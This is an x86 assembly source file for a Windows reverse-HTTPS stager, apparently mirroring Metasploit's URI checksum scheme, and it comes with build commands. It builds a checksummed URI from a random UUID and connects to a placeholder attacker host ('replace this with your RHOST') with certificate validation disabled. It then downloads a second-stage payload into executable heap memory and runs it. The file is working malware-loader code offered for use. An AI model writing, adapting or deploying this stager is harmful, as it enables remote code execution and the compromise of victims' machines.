extern ExitProcess
extern InternetSetOptionA
extern InternetOpenA
extern InternetConnectA
extern InternetReadFile
extern HttpOpenRequestA
extern HttpSendRequestA
extern HeapCreate
extern HeapAlloc
extern GetSystemTimeAsFileTime
extern CryptBinaryToStringA

; Compiles with the following
; nasm.exe -f win32 -o objectFile.obj .\code.asm
; GoLink.exe /dynamicbase /nxcompat /fo executable.exe .\objectFile.obj kernel32.dll wininet.dll Crypt32.dll


segment .data
Host db 'samplehost.example.com',0     ;replace this with your RHOST
Port dw  443                           ;replace this with your RPORT
UUID times 75 db 0
base64URI times 100 db 0
lowTime db 0
highTime db 0

segment .text

global Start
Start:
.genUUID:           ;generate the UUID
    mov ebx,UUID    ;Move the location that we will store the UUID into ebx
    rdrand eax      ;Read a random number to eax
    mov [ebx],eax   ;The first eight bytes of a UUID are the PUID which in our case will be random, move the random bytes we just made, to the start of the UUID
    add ebx,4       ;Move the pointer in EBX ahead 4 bytes
    rdrand eax      ;Generate 4 new random bytes for the rest of the PUID
    mov [ebx],eax   ;Append the next four bytes to the UUID
    add ebx,4       ;Move the pointer in EBX ahead 4 bytes
    rdrand eax      ;Now we need some random numbers for the architecture and platform XOR values
    mov[ebx],ax     ;Move the lower two bytes to the UUID, these are the architecture and platform XOR values
    add ebx,2       ;Increment the UUID pointer two bytes
    xor ecx,ecx     ;Clear ecx
    mov cl,ah       ;Move the high byte of ax to the low byte of cx so we can use it to xor the architecture value
    xor ecx,1       ;XOR the architecture (1: 32 bit) with the architecture XOR key
    mov [ebx],cl    ;Copy the XORed architecture to the UUID
    inc ebx         ;Increment the pointer to the UUID
    xor ecx,ecx     ;Clear eax again to prepare for xoring the platform
    mov cl,al       ;Copy the low byte of ax to the low byte of cx to perform the xor for our platform
    xor ecx,1       ;XOR the platform (1: windows) with the platform XOR key
    mov [ebx],cl    ;Add the result to the end of the uuid
    inc ebx         ;Increment the UUID pointer
    mov ecx,[ebx-6] ;Copy the architecture key, followed by the platform key followed by the values to ecx, we need these to make the timestamp xor key
    mov cx,[ebx-4]  ;Copy the architecture key, followed by the platform key to cx, we should now have a timestamp xor key, but backwards
    bswap ecx       ;Reverse the order of ecx, we now have platform XOR, architecture XOR, platform XOR, architecture XOR in ECX
    push ebx        ;Push values we need to save for after our syscall to the stack
    push ecx
    push lowTime    ;Push the pointer to our FILETIME structure to the stack
    call [GetSystemTimeAsFileTime]      ;Call this function to get the current time, the dwHighDateTime value will be our timestamp
    pop ecx         ;Recover the values we saved before our syscall
    pop ebx
    xor ecx,[highTime]  ;XOR the dwHighDateTime value with our timestamp xor key
    mov [ebx],ecx   ;Append the timestamp XORed value to the uuid, this completes our 16 byte UUID

.base64E:
    push UUID       ;Push the UUID pointer to get the string length
    call .strlen    ;Get the string lenght and store it in eax
    mov ecx,eax     ;Copy the value to ecx so we can use it later
    push 0          ;Push a null byte for use as a return value
    mov ebx,esp     ;Copy the stack pointer to ebx, this is a pointer to the null byte we just pushed to use as a return value
    push ecx        ;Push the string length
    push ebx        ;Pointer to base 64 string length
    push 0          ;NULL, this will return the encoded length to our pointer
    push 0x00000001 ;CRYPT_STRING_BASE64
    push ecx        ;UUID length
    push UUID       ;Pointer to UUID
    call [CryptBinaryToStringA]  ;This first call will return our encoded string length to us so we can make a second call to actually do the encoding
    pop ecx         
    push ebx            ;pointer to base 64 encoded length set from previous call
    push base64URI      ;pointer to buffer for output
    push 0x00000001     ;CRYPT_STRING_BASE64
    push ecx            ;UUID length
    push UUID           ;UUID
    call [CryptBinaryToStringA]
    
.validURI:              ;Check for valid URI base, must not contain / or +
    push base64URI      ;which are valid base64 but not valid in a uri
    call .base64Len     ;Finds the length of the encoded string not including any "=", "\r", or "\n"
    mov DWORD [ecx],0   ;Put a null byte at the end of the string length we just found to terminate the string
    push 0x2f           ;Push a "/"
    push base64URI      ;Push the encoded string
    call .strContains   ;Check if the encoded string contains a "/"
    cmp eax,0           ;If eax is not 0 (the encoded string contains a "/") then we need to generate a new UUID
    jne .clearURIandRestart ;jmp to a function to clear the UUID and restart
    push 0x2b           ;Push a "+"
    push base64URI      ;Push the encoded string
    call .strContains   ;Check if the encoded string contains a "+"
    cmp eax,0           ;If eax is not 0 (the encoded string contains a "+") then we need to generate a new UUID
    jne .clearURIandRestart ;jmp to a function to clear the UUID and restart
    jmp .appendRandom       ;URI must be longer than it is now, jump to append junk data until it meets a length requirement

.URIChecksum:           ;Check that the sum, modulus by 0x100 == 0x92, if it does jump to stage
    push base64URI
    call .sumURI        ;Get a sum of the characters in the URI
    mov ecx,eax
    xor edx,edx
    mov ebx,0x100
    idiv ebx            ;Divide the sum (returned from the function call to eax) by 0x100
    cmp edx,92          ;Check if the remainder is 92
    je .stage           ;If it is, the checksum is valid and we can move ahead to get the second stage

.appendURI:             ;This function tests if the required byte to meet the checksum is a valid character, if it is just append that and jump back to the URI checksum test
    mov ebx,92          ;Move the checksum target to ebx
    sub ebx,edx         ;Subtrackt the remainder from our target
    xor eax,eax
    mov al,bl           ;Move the difference to eax
    push eax            ;Push eax twice, once for the call to isBase64Char, then to save for use after the call
    push eax
    call .isBase64Char  ;Check if the character we need is in the base64 character set (minus "+" and "/")
    pop ecx             ;Recover the needed character
    cmp eax,1
    jne .appendRandom   ;If the character isn't in the base64 charset then we'll append a random character in the base64 charset
    mov eax,base64URI   ;Move the base64URI pointer to eax in order to append the required character to it
.appendURIFindEndLoop:
    cmp BYTE[eax],0     ;If the byte that eax points to is 0, then we've found the end of the string
    je .appendURIFindEndLoopEnd ;Jump to append the neede character
    inc eax             ;Increment eax to the next character
    jmp .appendURIFindEndLoop   ;Check the next character
.appendURIFindEndLoopEnd:
    mov BYTE [eax], cl  ;Move the required byte to the end of eax, our URI should now have a valid checksum
    jmp .URIChecksum    ;Double check though just in case
    
    
.appendRandom:          ;Append a random valid base64 character until the lenght is greater than 34
    rdrand ecx          ;Get some random bytes
    push ecx            ;Push them to the stack to test if they are in the base64 charset
    call .isBase64Char
    cmp eax,1
    jne .appendRandom   ;If the character isn't in the charset, try again
    mov eax,base64URI   ;Find teh end of the URI to append a character
.appendRandomFindEndLoop:
    cmp BYTE[eax],0
    je .appendRandomFindEndLoopEnd
    inc eax
    jmp .appendRandomFindEndLoop
.appendRandomFindEndLoopEnd:
    mov BYTE [eax], cl  ;Copy the random byte to the end of the URI
    push base64URI      ;Push the new URI
    call .strlen        ;Get the string length to ensure it is larger than required
    cmp eax,34
    jle .appendRandom   ;If it is still less than we need, append another character
    jmp .URIChecksum    ;Otherwise go back to the checksum to see if the URI is valid

.clearURIandRestart:    ;This function runs if the base url is invalid, it simply zeroes out the UUID and base64URL then it will jump to the entry point
    push 75             ;Push the number of characters to zero
    push UUID           ;Push the pointer to the bytes to zero
    call .zeroURI       ;Move zeroes to the location
    push 100            ;Do the previous again for the base64URI
    push base64URI
    call .zeroURI
    jmp .genUUID
    
    
    

.stage:
mov ebx,10          ;Max tries
mov ecx,0           ;Current attempt
.internetOpen:
    cmp ecx,ebx     ;If the current attempt is greater than the max, exit
    jg .exit
    push ebx        ;Save the counters to the stack
    push ecx
    push dword 0    ;Push parameters for InternetOpenA
    mov eax,0
    push esp
    push 0
    push 0
    push 0
    call [InternetOpenA]
    pop ecx         ;Recover the counters
    pop ebx
    inc ecx         ;Increment the attempt counter
    cmp eax,0       ;Compare output to 0 and retry if failed
    jz .internetOpen

.internetConnect:   ;Create the connection to the server using InternetConnectA
    push 0
    mov ebx,esp
    push ebx
    push 0x0
    push byte 3 ;INTERNET_SERVICE_HTTP
    push 0
    push 0
    push DWORD [Port]
    push DWORD Host
    push eax
    call [InternetConnectA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit

.httpOpenRequest:   ;Create an HTTP request using HttpOpenRequestA
    push 0
    push esp
    push 0x84C43300 ;INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE
    push 0
    push 0
    push 0
    push DWORD base64URI
    push 0
    push eax
    call [HttpOpenRequestA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit

.internetSetOptionA:
    push 0x001380 ;SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION
    mov ebx,esp
    push eax
    push 4
    push ebx
    push 31 ;INTERNET_OPTION_SECURITY_FLAGS
    push eax
    call [InternetSetOptionA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit
    mov eax,[esp]
    
.httpSendRequest:
    push 0
    push 0
    push 0
    push 0
    push eax
    call [HttpSendRequestA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit


.heapCreate:    ;Create a new section of memory with RWX permissions for us to put our payload into
    push 0
    push 300000     ; Initial size
    push 0x00040000 ; HEAP_CREATE_ENABLE_EXECUTE
    call [HeapCreate]


.heapAlloc:     ;Allocate the memory in the heap
    push 300000
    push 8 ; HEAP_ZERO_MEMORY
    push eax
    call [HeapAlloc]
    

    
.copyBytes:
    pop edx         ;Copy request handle to edx
    mov ecx,eax     ;Copy the pointer to the heap to ecx
    push 0          ;bytes read
    mov ebx,esp     ;pointer to bytes read
    
.loop:
    pushad          ;Save our register values for later
    push ebx
    push 1024
    push ecx        ;Heap location to store data
    push edx        ;internet handle to read from
    call [InternetReadFile]
    popad
    add ecx,[ebx]   ;Add bytes read to the heap pointer
    cmp DWORD [ebx],1024    ;If the bytes read are less than the max, then we've hit the end of the file so we can leave the loop
    je .loop
    
.run:
    call eax        ;Call our downloaded shellcode


.exit:
    push dword 0
    call [ExitProcess]
    
.strlen:
    xor eax,eax         ;zero eax
    pop ebx             ;copy the return address to ebx
    pop ecx             ;copy the string address to ecx
    cmp BYTE [ecx],0    ;Compare the byte to zero
    je .strlenLoopEnd   ;If the byte is zero, the string length is zero, so we can return
.strlenLoopStart:
    inc ecx             ;Increment the string pointer
    inc eax             ;Increment the string length counter
    cmp BYTE [ecx],0    ;Compare the byte to 0
    jne .strlenLoopStart    ;If the byte isn't zero, continue counting
.strlenLoopEnd:
    push ebx            ;Push the return address to the stack and return
    ret

.base64Len:             ;Very similar to the last function, except we return after hitting "=", "\r", or "\n"
    xor eax,eax
    pop ebx
    pop ecx
.base64LenLoopStart:
    inc ecx
    inc eax
    cmp BYTE [ecx],0x0D
    je .base64LenLoopEnd
    cmp BYTE [ecx],0x0A
    je .base64LenLoopEnd
    cmp BYTE [ecx],0x3D
    je .base64LenLoopEnd
    jmp .base64LenLoopStart
.base64LenLoopEnd:
    push ebx
    ret

.strContains:           ;Similar to the previous, but it checks for a specific character in a string and returns 1 or 0
    xor eax,eax
    pop ebx
    pop ecx
    pop edx
.strContainsLoopStart:
    cmp BYTE [ecx],dl
    je .exitStrContainsFail
    inc ecx
    cmp BYTE[ecx],0
    je .exitStrContainsSuccess
    jmp .strContainsLoopStart
.exitStrContainsFail:
    inc eax
.exitStrContainsSuccess:
    push ebx
    ret

.zeroURI:
    pop ebx             ;Pop the return address
    pop ecx             ;Pop the pointer to memory to be zeroed
    pop edx             ;Pop the length to zero
    xor eax,eax         ;Zero eax
.zeroStartURI:
    mov BYTE [ecx],0x0  ;Zero the byte pointed at by ecx
    inc eax             ;Increment the counter of bytes zeroed
    inc ecx             ;Increment pointer to the memory to be zeroed
    cmp eax,edx         ;If the number of bytes zeroed does not equal the number of bytes to zero, keep zeroing bytes
    jne .zeroStartURI
    push ebx            ;Push the return address to the stack
    ret
    
.sumURI:
    pop ebx
    xor eax,eax
    pop ecx             ;Pop the string to ecx
.sumURILoop:
    xor edx,edx         ;zero edx
    mov dl,BYTE [ecx]   ;Copy the byte pointed to by ecx to the low byte of dx
    add eax,edx         ;Add edx to eax
    inc ecx             ;Increment the pointer to the next char in the string
    cmp BYTE [ecx],0    ;If the byte is zero we can return, otherwise keep going
    jne .sumURILoop
    push ebx
    ret
    
.isBase64Char:
    pop ebx
    pop ecx                 ;Copy the character to ecx
    mov eax,1               ;Set the return value to 1 (true)
.isBase64CharNum:           ;Valid characters are a-z, A-Z, and 0-9
    cmp cl,0x7a
    jg .isBase64CharFalse   ;If the character is greater than the last char ("z"), return false
    cmp cl,0x61
    jge .isBase64CharTrue   ;If the character is greater or equal to "a" but less or equal to "z" return true
    cmp cl,0x5a
    jg .isBase64CharFalse   ;If the character is greater than "Z" but less than "a" return false
    cmp cl,0x41
    jge .isBase64CharTrue   ;If the character is greater or equal to  "A" but less or equal to "Z" return true
    cmp cl,0x39
    jg .isBase64CharFalse   ;If the character is greater than "9" but less than "A" return false
    cmp cl,0x30
    jge .isBase64CharTrue   ;If the character is greater or equal to  "0" but less or equal to "9" return true
.isBase64CharFalse:
    mov eax,0
.isBase64CharTrue:
    push ebx
    ret
